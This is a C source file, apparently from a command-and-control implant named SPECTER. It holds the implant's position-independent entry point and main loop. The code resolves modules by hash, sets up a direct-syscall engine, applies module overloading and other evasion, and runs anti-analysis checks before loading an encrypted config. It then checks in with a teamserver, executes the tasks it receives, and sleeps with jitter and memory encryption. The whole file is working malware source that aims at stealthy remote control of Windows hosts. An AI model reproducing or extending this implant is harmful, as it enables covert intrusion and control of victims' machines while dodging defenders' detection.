/**
 * SPECTER Implant — PIC Entry Point & Main Loop
 *
 * Position-independent entry. Resolves PEB, bootstraps the syscall
 * engine, initializes all subsystems (config, sleep, comms), and
 * enters the main callback loop.
 */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "syscalls.h"
#include "crypto.h"
#include "config.h"
#include "comms.h"
#include "sleep.h"
#include "evasion.h"
#include "antianalysis.h"
#include "profile.h"
#include "bus.h"
#include "task_exec.h"

/* Implant context — file-scope static, no extern cross-TU references.
   All subsystems receive a pointer to this via init functions. */
static IMPLANT_CONTEXT g_ctx;

/* Builder-patchable build flags region.
   Marker "SPBF" (4 bytes) + 1 byte flags value.
   The builder locates the marker, patches the flags byte, and scrubs the
   marker with random bytes.  volatile const prevents the compiler from
   optimizing away reads or the marker bytes themselves. */
static volatile const BYTE g_build_flags_region[] = {
    'S','P','B','F',  /* marker — builder finds and scrubs this */
    0x00              /* flags byte — builder patches this       */
};

/* Read the builder-patched build flags (safe to call before cfg_init). */
static BYTE get_build_flags(void) {
    return g_build_flags_region[4];
}

/* Forward declarations for cleanup */
static void implant_cleanup(void);

/* Dev build: resolve ExitProcess + OutputDebugStringA for diagnostics */
#ifdef SPECTER_DEV_BUILD
typedef void (__attribute__((ms_abi)) *fn_ExitProcess)(DWORD code);
typedef void (__attribute__((ms_abi)) *fn_OutputDebugStringA)(const char *);
static fn_ExitProcess g_dev_exit = NULL;
static fn_OutputDebugStringA g_dev_dbg = NULL;

static void dev_exit(DWORD code) {
    if (g_dev_exit) g_dev_exit(code);
}

/* Emit a trace string visible in DebugView / WinDbg */
static void dev_trace(const char *msg) {
    if (g_dev_dbg) g_dev_dbg(msg);
}

/* Emit trace with a numeric value: "prefix: NNN" */
static void dev_trace_val(const char *prefix, DWORD val) {
    if (!g_dev_dbg) return;
    char buf[128];
    DWORD i = 0;
    const char *p = prefix;
    while (*p && i < 120) buf[i++] = *p++;
    buf[i++] = ':'; buf[i++] = ' ';
    /* Simple decimal conversion */
    char tmp[12];
    DWORD t = 0;
    if (val == 0) { tmp[t++] = '0'; }
    else { DWORD v = val; while (v) { tmp[t++] = '0' + (v % 10); v /= 10; } }
    while (t > 0 && i < 126) buf[i++] = tmp[--t];
    buf[i] = 0;
    g_dev_dbg(buf);
}

static void dev_init_exit(PVOID k32) {
    /* DJB2("ExitProcess") = 0x024773DE */
    g_dev_exit = (fn_ExitProcess)find_export_by_hash(k32, 0x024773DE);
    /* DJB2("OutputDebugStringA") = computed below */
    g_dev_dbg = (fn_OutputDebugStringA)find_export_by_hash(k32, HASH_OUTPUTDEBUGSTRINGA);
}
#define DEV_FAIL(code) do { dev_trace_val("SPECTER DEV_FAIL", code); dev_exit(code); return; } while(0)
#define DEV_TRACE(msg) dev_trace(msg)
#define DEV_TRACE_VAL(msg, val) dev_trace_val(msg, val)
#else
#define DEV_FAIL(code) return
#define DEV_TRACE(msg) ((void)0)
#define DEV_TRACE_VAL(msg, val) ((void)0)
#endif

__attribute__((section(".text$A")))
void implant_entry(PVOID param) {
    (void)param;
    NTSTATUS status;

    /* ---- Zero out global context ---- */
    spec_memset(&g_ctx, 0, sizeof(IMPLANT_CONTEXT));

    /* ---- Step 1: Verify PEB access ---- */
    PPEB peb = get_peb();
    if (!peb)
        DEV_FAIL(10);

    /* ---- Step 2: Resolve ntdll and kernel32 base addresses ---- */
    PVOID ntdll_base = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll_base)
        DEV_FAIL(11);

    PVOID k32_base = find_module_by_hash(HASH_KERNEL32_DLL);
#ifdef SPECTER_DEV_BUILD
    if (k32_base) dev_init_exit(k32_base);
#endif
    (void)k32_base;
    DEV_TRACE("[SPECTER] kernel32 + debug init OK");

    /* ---- Step 3: Initialize the syscall engine ---- */
    g_ctx.syscall_table = sc_get_table();
    status = sc_init(g_ctx.syscall_table);
    if (!NT_SUCCESS(status))
        DEV_FAIL(12);
    DEV_TRACE("[SPECTER] syscall engine OK");

    g_ctx.clean_ntdll = g_ctx.syscall_table->clean_ntdll;

    /* ---- Step 3a-pre: Module overloading (must happen early) ---- */
    /* If evasion_flags will be known from config, we check later.
       For now, attempt module overloading before evasion_init so that
       the implant can relocate into a clean backed section.  The
       evasion_flags check happens after config init; module overload
       is gated by a compile-time flag or early config peek. */

    /* ---- Step 3b: Initialize evasion engine ---- */
    status = evasion_init(&g_ctx);
    /* Evasion init failure is non-fatal — syscalls still work via
       raw spec_syscall fallback in evasion_syscall() */
    (void)status;

    /* ---- Step 3b.1: Initialize syscall wrappers with context ---- */
    syscall_wrappers_init(&g_ctx);

    /* ---- Step 3c: Anti-analysis checks ---- */
    /* Anti-analysis runs BEFORE config is loaded.  The compile-time
       SPECTER_DEV_BUILD flag and the builder-patchable build_flags
       region (readable before cfg_init) both gate this check. */
    {
        BOOL skip_aa = FALSE;
#ifdef SPECTER_DEV_BUILD
        skip_aa = TRUE;
#endif
        if (get_build_flags() & BUILD_FLAG_SKIP_ANTIANALYSIS)
            skip_aa = TRUE;

        if (!skip_aa) {
            ANTIANALYSIS_CONFIG aa_cfg;
            ANALYSIS_RESULT aa_result;
            antianalysis_default_config(&aa_cfg);
            ANALYSIS_TYPE aa_type = antianalysis_check(&g_ctx, &aa_cfg, &aa_result);
            if (aa_type != ANALYSIS_CLEAN) {
                antianalysis_respond(&g_ctx, aa_cfg.response);
                return;
            }
        }
    }

    /* ---- Step 4: Initialize config store ---- */
    DEV_TRACE("[SPECTER] cfg_init...");
    status = cfg_init(&g_ctx);
    if (!NT_SUCCESS(status)) {
        DEV_TRACE_VAL("[SPECTER] cfg_init FAILED status", (DWORD)(status & 0xFFFF));
        /* Sub-codes: 130 = NULL ctx, 131 = no pic_base, 132 = blob not found,
           133 = decrypt fail, 134 = parse fail, 139 = other */
        if (status == 0xC0000002) DEV_FAIL(130);       /* STATUS_INVALID_PARAMETER */
        if (status == 0xC0000034) DEV_FAIL(132);       /* STATUS_OBJECT_NAME_NOT_FOUND */
        if (status == 0xC000003A) DEV_FAIL(133);       /* STATUS_OBJECT_PATH_NOT_FOUND (decrypt) */
        if (status == 0xC0000005) DEV_FAIL(134);       /* STATUS_ACCESS_VIOLATION (parse) */
        DEV_FAIL(139);
    }

    /* ---- Step 4b: Module overloading (post-config) ---- */
    {
        IMPLANT_CONFIG *icfg = cfg_get(&g_ctx);
        if (icfg && (icfg->evasion_flags & EVASION_FLAG_MODULE_OVERLOAD)) {
            PVOID overload_base = NULL;
            SIZE_T overload_size = 0;
            EVASION_CONTEXT *ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
            status = evasion_module_overload(ectx, &overload_base, &overload_size);
            if (NT_SUCCESS(status) && overload_base) {
                /* Copy implant PIC blob into the module-backed section.
                   The implant is position-independent so it runs from
                   any base address. After copy, the original allocation
                   can be freed by the caller. */
                extern void implant_entry(PVOID);
                PVOID pic_base = (PVOID)implant_entry;
                /* Estimate PIC size from config scan limit */
                SIZE_T pic_size = CONFIG_SCAN_MAX;
                if (pic_size > overload_size)
                    pic_size = overload_size;
                spec_memcpy(overload_base, pic_base, pic_size);

                /* Flip the overloaded section from RW → RX now that
                   the PIC blob has been copied in. */
                evasion_module_overload_finalize(ectx, overload_base, pic_size);
            }
        }

        /* NtContinue entry transfer: re-enter the main loop from a
           clean thread context with synthetic stack frames */
        if (icfg && (icfg->evasion_flags & EVASION_FLAG_NTCONTINUE_ENTRY)) {
            /* NtContinue transfer is deferred until after all init is
               complete — see below after comms_init.  Flag is checked
               after the main loop setup. */
        }
    }

    /* ---- Step 5: Check kill date before proceeding ---- */
    if (cfg_check_killdate(&g_ctx))
        DEV_FAIL(14);

    /* ---- Step 6: Initialize sleep controller ---- */
    /* Skip full sleep init for dev builds or when debug flag is set
       (runtime check via builder-patchable flags + config build_flags). */
    {
        BOOL skip_sleep_init = FALSE;
#ifdef SPECTER_DEV_BUILD
        skip_sleep_init = TRUE;
#endif
        if (get_build_flags() & BUILD_FLAG_DEBUG)
            skip_sleep_init = TRUE;
        {
            IMPLANT_CONFIG *scfg = cfg_get(&g_ctx);
            if (scfg && (scfg->build_flags & BUILD_FLAG_DEBUG))
                skip_sleep_init = TRUE;
        }

        if (!skip_sleep_init) {
            status = sleep_init(&g_ctx);
            if (!NT_SUCCESS(status))
                DEV_FAIL(15);
        }
    }

    /* ---- Step 7: Initialize communications engine ---- */
    DEV_TRACE("[SPECTER] comms_init...");
    status = comms_init(&g_ctx);
    if (!NT_SUCCESS(status)) {
        DEV_TRACE_VAL("[SPECTER] comms_init FAILED status", (DWORD)(status & 0xFFFF));
        DEV_FAIL((DWORD)(status & 0xFFFF));
    }
    DEV_TRACE("[SPECTER] comms_init OK — first checkin succeeded");

    /* ---- Step 7a: Initialize module bus ---- */
    DEV_TRACE("[SPECTER] bus_init...");
    status = bus_init(&g_ctx);
    if (!NT_SUCCESS(status)) {
        DEV_TRACE_VAL("[SPECTER] bus_init FAILED", (DWORD)(status & 0xFFFF));
        /* Non-fatal: module execution won't work, but built-in tasks
           and legacy cmd execution still function. */
    } else {
        DEV_TRACE("[SPECTER] bus_init OK");

        /* Initialize guardian thread subsystem (VEH crash isolation) */
        status = guardian_init(&g_ctx);
        if (!NT_SUCCESS(status)) {
            DEV_TRACE_VAL("[SPECTER] guardian_init FAILED", (DWORD)(status & 0xFFFF));
        } else {
            DEV_TRACE("[SPECTER] guardian_init OK");
        }

        /* Initialize module lifecycle manager */
        status = modmgr_init(&g_ctx);
        if (!NT_SUCCESS(status)) {
            DEV_TRACE_VAL("[SPECTER] modmgr_init FAILED", (DWORD)(status & 0xFFFF));
        } else {
            DEV_TRACE("[SPECTER] modmgr_init OK");
        }
    }

    /* ---- Step 7b: Initialize malleable C2 profile (if embedded) ---- */
    /* Profile blob is expected to be provided via config update or
     * embedded after config blob. When available, parse and attach
     * to comms engine for profile-driven traffic shaping. */
    {
        static PROFILE_CONFIG g_profile_cfg;
        /* TODO: Locate profile blob (e.g., second config region or
         * delivered via initial config update from teamserver).
         * For now, profile is set via comms_set_profile() after
         * a profile blob is received from the teamserver. */
        (void)g_profile_cfg;
    }

    /* ---- Step 8: Enter main loop ---- */
    g_ctx.running = TRUE;
    DWORD consecutive_failures = 0;

    while (g_ctx.running) {
        /* Perform encrypted check-in with teamserver */
        status = comms_checkin(&g_ctx);

        if (!NT_SUCCESS(status)) {
            consecutive_failures++;

            /* Try rotating to next channel on failure */
            comms_rotate_channel(&g_ctx);

            /* Check retry limit */
            IMPLANT_CONFIG *cfg = cfg_get(&g_ctx);
            if (cfg && cfg->max_retries > 0 &&
                consecutive_failures >= cfg->max_retries) {
                g_ctx.running = FALSE;
                break;
            }
        } else {
            consecutive_failures = 0;
        }

        /* Process received tasks from this checkin */
        if (g_ctx.pending_task_count > 0) {
            DEV_TRACE_VAL("[SPECTER] tasks received", g_ctx.pending_task_count);
            for (DWORD ti = 0; ti < g_ctx.pending_task_count; ti++) {
                execute_task(&g_ctx, &g_ctx.pending_tasks[ti]);
            }
            /* Free task data buffers and reset count */
            task_free_pending(&g_ctx);
        }

        /* If kill was received, send final checkin with results before exiting (Fix 5) */
        if (!g_ctx.running && g_ctx.task_result_count > 0) {
            DEV_TRACE("[SPECTER] sending final checkin before exit");
            comms_checkin(&g_ctx);
        }

        /* Check kill date */
        if (cfg_check_killdate(&g_ctx)) {
            g_ctx.running = FALSE;
            break;
        }

        /* Sleep with jitter and memory encryption.
           Debug mode (compile-time or runtime) uses a simple 5-second
           NtDelayExecution sleep instead of the full sleep_cycle. */
        {
            BOOL use_simple_sleep = FALSE;
#ifdef SPECTER_DEV_BUILD
            use_simple_sleep = TRUE;
#endif
            if (get_build_flags() & BUILD_FLAG_DEBUG)
                use_simple_sleep = TRUE;
            {
                IMPLANT_CONFIG *slp_cfg = cfg_get(&g_ctx);
                if (slp_cfg && (slp_cfg->build_flags & BUILD_FLAG_DEBUG))
                    use_simple_sleep = TRUE;
            }

            if (use_simple_sleep) {
                LARGE_INTEGER delay;
                delay.QuadPart = -50000000LL; /* 5 seconds in 100ns units */
                spec_NtDelayExecution(FALSE, &delay);
            } else {
                sleep_cycle(&g_ctx);
            }
        }
    }

    /* ---- Cleanup and exit ---- */
    implant_cleanup();
    return;
}

static void implant_cleanup(void) {
    /* Shut down module bus subsystems (kill running modules, remove VEH) */
    if (g_ctx.module_bus) {
        MODULE_MANAGER *mgr = modmgr_get();
        if (mgr)
            modmgr_shutdown(mgr);
        guardian_shutdown();
    }

    /* Free any remaining pending tasks and results */
    task_free_pending(&g_ctx);
    task_free_results(&g_ctx);

    /* Zero sensitive data from global context */
    IMPLANT_CONFIG *cfg = cfg_get(&g_ctx);
    if (cfg)
        spec_memset(cfg, 0, sizeof(IMPLANT_CONFIG));

    g_ctx.running = FALSE;
}
